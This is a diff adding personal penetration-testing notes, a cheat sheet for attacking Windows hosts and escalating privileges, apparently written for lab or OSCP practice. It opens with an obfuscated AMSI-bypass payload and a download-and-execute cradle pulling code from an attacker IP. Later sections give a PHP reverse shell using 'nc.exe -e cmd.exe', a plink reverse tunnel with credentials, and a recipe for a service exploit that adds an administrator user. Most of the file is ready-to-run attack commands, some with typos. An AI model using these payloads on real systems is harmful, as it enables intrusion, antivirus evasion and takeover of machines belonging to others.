@@ -1,0 +1,265 @@
+no detection payload
+
+take a netcat session and then run the below against metasploit web_delivery and use 32 bit only:
+
+sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )    --- amsi bypass
+
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true} ;   --- ignore SSL warning
+
+IEX ((new-object Net.WebClient).DownloadString('http://192.168.94.146:8080/mhz3i19'));
+
+
+-------------------------------------------------------------
+to upload the files via ftp onto kali machine using python
+
+sudo apt-get install python3-pyftpdlib
+
+sudo python3 -m pyftpdlib -p 21 --write
+
+and on windows
+
+ftp.exe <kali-ip>
+anonymous anonymous
+put <file-name>
+
+--------------------------------------------------------------
+
+
+002 Fuzzy-Security-Guide
+https://www.fuzzysecurity.com/tutorials/16.html
+
+002 PayloadsAllTheThings-Guide
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
+
+002 Absolombs-Guide
+https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
+
+002 Sushant-747s-Guide
+https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html
+
+---------------------------------------------------------------------------
+Enumeration
+
+Domain controllers:
+
+nslookup.exe
+set type=all
+_ldap._tcp.dc._msdcs.domain-name
+
+systeminfo
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
+hostname
+
+wmic qfe | ft -Autosize  -- to check for the latest upadtes
+
+wmic logicaldisk | Out-GridView or wmic logicaldisk get caption,description,
+
+------------------------------------------------
+User enumeration
+whoami
+whoami /priv
+whoami /groups
+net user 
+net localgroup
+
+-------------------------------------------
+Network Enumeration
+ipconfig /all
+arp -a
+route print
+netstat -ano
+
+---------------------------------------------
+password hunting
+findstr /si password *.txt *.ini *.config
+Password loot -- 
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#sam-and-system-files
+
+--------------------------------------------
+Enumerate the AV and Firewall
+sc query windefend
+sc queryex type= service
+netsh advfirewall firewall dump
+
+netsh firewall show state
+--------------------------------------------
+Enumeration via Automated tools
+winPEAS.exe
+Seatbelt.exe
+Watson.exe
+SharpUP.exe 
+Sherlock.ps1
+PowerUp.ps1
+jaws-enum.ps1
+Windows-exploit-suggester.py
+Exploit suggester (msf)
+
+AV-bypassed above scripts-- /Desktop/AV-bypassed/Domain-escalate/
+------------------------------------------------
+Running exploit-suggester in first place.
+sudo python -m pip install xlrd==1.2.0
+run "systeminfo" in windows and copy the output
+python windows-exploit-suggester.py --update  ====== will give an updated database
+sudo python windows-exploit-suggester.py --database 2020-12-16-mssb.xls --systeminfo systeminfo.txt 
+
+------------------------------------------------
+password hunting
+got the password through registry winlogon, but run other commands or scripts from below:
+https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html
+
+then download plink.exe 
+on kali machine install ssh and nano /etc/ssh/sshd-config and uncomment permitrootlogin yes
+
+
+and on windows machine run the below command:
+plink.exe -l <username-of-remote_connection_machine-here-kali-root> -pw <passw-of-root-kali-machine> -R(portforward) 445:127.0.0.0:445 <target-IP> and boom we get a Kali machine shell over windows
+breaking down the 445:127.0.0.1:445
+445 -- opening the 445 port of windows mchine (which is the target or victim machine)
+127.0.0.1 -- victim machine local shell IP
+445 -- the port to connect to the remote machine
+
+plink.exe -l deep -pw y -R 445:127.0.0.1:445 192.168.94.146 (Kali IP)   and then sudo su
+winexe -U Administrator%y@123 //127.0.0.1 "cmd.exe"
+
+
+-----------------------------------------------------------
+Escalating via linux machine priv escalation (WSL - Windows Subsystem for linux)
+
+On Kali Machine
+Try first login through smbclient -- smbclient \\\\192.168.94.132\\
+Then with psexec.py deepa:'pas'@Target-ip
+
+smbclient\\\target-ip\\<share> -U <username> and will ask for password
+upload a php then if IIS is running --
+put nc.exe 
+put reverse.php -- code is given below:
+<?php
+system('nc.exe -e cmd.exe ip-kali-machine port-on-kali-machine')
+?>
+
+now on kali machine open nc --
+nc -nlvp <port>
+
+and open the web-page
+target-ip:port\reverse.php
+
+and boom we have a reverse-shell
+
+Now escalting privileges with WSL
+
+where /R c:\ bash.exe
+where /R c:\Windows wsl.exe
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---windows-subsystem-for-linux-wsl == try this with wsl.exe
+
+if wsl doesn't work try with bash.exe below:
+
+<path-to-bash.exe> bash.exe
+whoami
+python -c "import pty;pty.spawn('/bin/bash')"    --- spawning a tty shell https://netsec.ws/?p=337
+and we have a linux shell.....
+---------------------------------------------------------
+Token Impersonation
+Tokens -- are like temporary keys or cookies for computers, which are provided to access the file rather than providing the credentials
+These are of two types:
+1. Delegate token --  created and used to access remote computers like RDP and then leaving behind a token
+2. Impersonate token -- are like "non-interactive", which are like attaching a network drive or using a domain logon script.
+
+whoami /priv
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---impersonation-privileges
+https://github.com/gtworek/Priv2Admin
+
+use tater or hot-potato executable
+or in metasploit- using ms16-075 exploit, getting a meterpreter shell
+
+-----------------------------------------------
+
+Alternate data streams -- to find the hidden text files or hidden files
+
+gci -recurse | % { gi $_.FullName -stream * } | where stream -ne ':$Data'     or  dir /R
+---------------------------------------------
+Escalation via RunAs
+
+cmdkey /list -- to identify the stored credentials
+
+runas.exe /user:<username> cmd.exe
+
+Shell with domain user privileges
+C:\runas.exe /netonly /user:BLAHDOMAIN\blahuser cmd.exe
+
+-------------------------------------------------------------------------
+Priv Escalation with Autoruns
+
+run autorun.exe from sysinternals
+and check what all programs have autorun enabled, and I have cmd.exe as autorun, now use accesscheck4.exe 
+
+accesscheck4.exe -wvu "C:\windows\system32\cmd.exe" and boom we have File all access
+Now create a malicious, reverseshell file, and ask Administrator to log-in into the system, and boom we have a administrator reverse_connection (also known as DLL hijacking)
+
+------------------------------------------------
+Always installed elevated
+
+HKLM\Software\Policies\Microsoft\Windows\Installer === 1, then always install elevated can be exploited
+
+so, run the below commands:
+
+reg query HKLM\Software\Policies\Microsoft\Windows\Installer
+reg query HKCU\Software\Policies\Microsoft\Windows\Installer
+
+from PowerUp run Write-UserAddMSI, the same can be used from metasploit module
+-------------------------------------------------
+Service Path Escalation (regservice)
+
+Get-ACL -Path hklm:\System\CurrentControlSet\services\regsvc | fl    and we have NT Authority Allow full control   --- See if the output suggests that user belong to “NT AUTHORITY\INTERACTIVE” has “FullContol” permission over the registry key.
+
+https://raw.githubusercontent.com/ASzampiasSWD/OSCP/master/WindowsPriv/windows_service.c   -- download the exploit from here
+
+Edit the file as:
+system("cmd.exe /k net localgroud Administrators <username> /add")
+
+x86_64-w64-mingw32-gcc windows_service.c -o x.exe
+
+Place x.exe in C:\Temp
+
+Open command prompt at type:
+reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
+
+In the command prompt type: sc start regsvc
+
+and boom the user is added to Administrators groud --  net localgroup administrators
+
+----------------------------------------------------------------------
+Executable path as a service
+
+Using PowerUp, run Invoke-All-checks and we have folder "FILE ALL ACCESS" & filepermsvc on an executable in that folder and confirm with below command:
+
+accesscheck64.exe -wvu "<folder-name>"
+FILE_ALL_ACCESS --- in return
+now, from the previous file only, x.exe, now replace the executable_file in that folder
+and run -- sc start filepermsvc
+
+and boom w ehave a user in Administrator group
+
+-------------------------------------------------------------------------
+Escalation via StartUp applications:
+
+icacls.exe  "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"
+
+F -- means Full Access
+https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls
+
+Create a Anti-detection metasploit executable or use the x.exe from above.
+place in startup folder, and let the Administrator logged-in into the desktop and boom we have the privilege escalated reverse-shell or userd added to the system
+
+
+Using PowerUpSQL
+
+---------------------------------------------------------------------------
+DLL Hijacking
+
+--------------------------------
+Unquoted service
+------------------------------
+cve2019-1388
+
+
